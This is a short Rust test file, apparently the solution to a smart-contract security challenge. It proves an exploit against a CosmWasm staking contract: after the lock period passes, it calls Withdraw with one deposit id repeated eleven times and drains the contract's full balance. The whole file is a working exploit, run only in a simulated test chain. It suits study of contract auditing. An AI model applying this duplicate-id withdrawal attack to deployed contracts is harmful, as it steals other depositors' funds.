// cargo test --release -- exploit::exploit::exploit --exact --nocapture

#[cfg(test)]
pub mod exploit {
    use crate::{
        contract::{DENOM, LOCK_PERIOD, MINIMUM_DEPOSIT_AMOUNT},
        integration_tests::tests::{proper_instantiate, USER},
        msg::ExecuteMsg,
    };
    use cosmwasm_std::{Addr, Uint128};
    use cw_multi_test::Executor;

    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        let player = Addr::unchecked(USER);

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        let balance = app
            .wrap()
            .query_balance(contract_addr.clone(), DENOM)
            .unwrap();
        assert_eq!(balance.amount, MINIMUM_DEPOSIT_AMOUNT * Uint128::new(11));

        let msg = ExecuteMsg::Withdraw { ids: vec![1; 11] };
        let result = app
            .execute_contract(player, contract_addr.clone(), &msg, &[])
            .unwrap();
        let balance = app.wrap().query_balance(contract_addr, DENOM).unwrap();
        assert_eq!(balance.amount, Uint128::new(0));
        println!("result: {:?}", result);
    }
}
